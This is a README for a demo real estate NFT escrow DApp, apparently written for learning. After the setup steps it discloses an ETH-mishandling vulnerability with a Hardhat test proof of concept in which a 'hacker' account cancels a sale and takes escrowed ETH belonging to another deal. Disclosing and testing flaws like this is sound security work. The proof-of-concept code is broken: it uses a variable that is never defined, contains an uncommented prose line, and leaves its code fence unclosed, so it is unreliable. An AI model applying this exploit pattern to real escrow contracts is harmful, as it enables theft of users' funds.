# Real Estate NFT DApp

## Technology Stack & Tools

- Solidity (Writing Smart Contracts & Tests)
- Javascript (React & Testing)
- [Hardhat](https://hardhat.org/) (Development Framework)
- [Ethers.js](https://docs.ethers.io/v5/) (Blockchain Interaction)
- [React.js](https://reactjs.org/) (Frontend Framework)

## Requirements For Initial Setup
- Install [NodeJS](https://nodejs.org/en/)

## Setting Up
### 1. Clone/Download the Repository

### 2. Install Dependencies:
`$ npm install`

### 3. Run tests
`$ npx hardhat test`

### 4. Start Hardhat node
`$ npx hardhat node`

### 5. Run deployment script
In a separate terminal execute:
`$ npx hardhat run ./scripts/deploy.js --network localhost`

### 7. Start frontend
`$ npm run start`

## Mishandling of ETH Vulnerability

### Summary
This vulnerability led to unauthorized ETH withdrawals during sale cancellations, as shown in the provided proof of concept (POC).

<details>
<summary>Click to view the Proof of Concept</summary>

```javascript
describe("ETH Mishandling in Cancel Sale", () => {
    describe("Failure", async () => {
        it("Check for deposit earnest", async () => {
            const nftId_1 = 1
            const nftId_2 = 2

            // Deposit for NFT 1
            const depositTx = await escrow.connect(buyer).depositEarnest(1, {
                value: tokens(5)
            })
            await depositTx.wait()

            // Escrow balance before
            const escrowBalanceBefore = await escrow.getBalance()

            // Hacker balance before
            const hackerBalanceBefore = await hre.ethers.provider.getBalance(
                hacker.address)

            // Inspector passes inspection for NFT 1
            const inspectionTx1 = await escrow.connect(inspector).updateInspectionStatus(1, true)
            await inspectionTx1.wait()

            // Approve sale by buyer, seller and lender for NFT 1
            const approveTx1 = await escrow.connect(buyer).approveSale(1)
            await approveTx1.wait()

            const approveTx2 = await escrow.connect(seller).approveSale(1)
            await approveTx2.wait()

            const approveTx3 = await escrow.connect(lender).approveSale(1)
            await approveTx3.wait()

            // Lender send ETH to the contract for NFT 1
            const inspectionTx2 = await lender.sendTransaction({
                to: escrow.address,
                value: tokens(5)
                })

            // Mint NFT 2
            const mintTx2 = await realEstate.connect(seller).mint("https://ipfs.io/ipfs/QmTudSYeM7mz3PkYEWXWqPjomRPHogcMFSq7XAvsvsgAPS")
            await mintTx2.wait()

            // Approve NFT 2 for Escrow
            const approveTx = await realEstate.connect(seller).approve(escrow.address, 2);
            await approveTx.wait()

            // List NFT 2
            const listTransaction2 = await escrow.connect(seller).list(
                2, hacker.address, 
                tokens(15), 
                tokens(10))
            await listTransaction2.wait()

            // Hacker cancel sale for NFT 2
            const cancelTx = await escrow.connect(hacker).cancelSale(2);
            await cancelTx.wait()

            // Check Escrow balance after cancel sale   
            expect(escrowBalanceAfter).to.equal(escrowBalanceBefore);

            // Hacker balance after
            const hackerBalanceAfter = await hre.ethers.provider.getBalance(hacker.address)
            expect(hackerBalanceAfter).to.be.greaterThan(hackerBalanceBefore)

            Finalize sale for NFT 1
            await expect(escrow.connect(seller).finalizeSale(1))
        })
    })
})
</details>

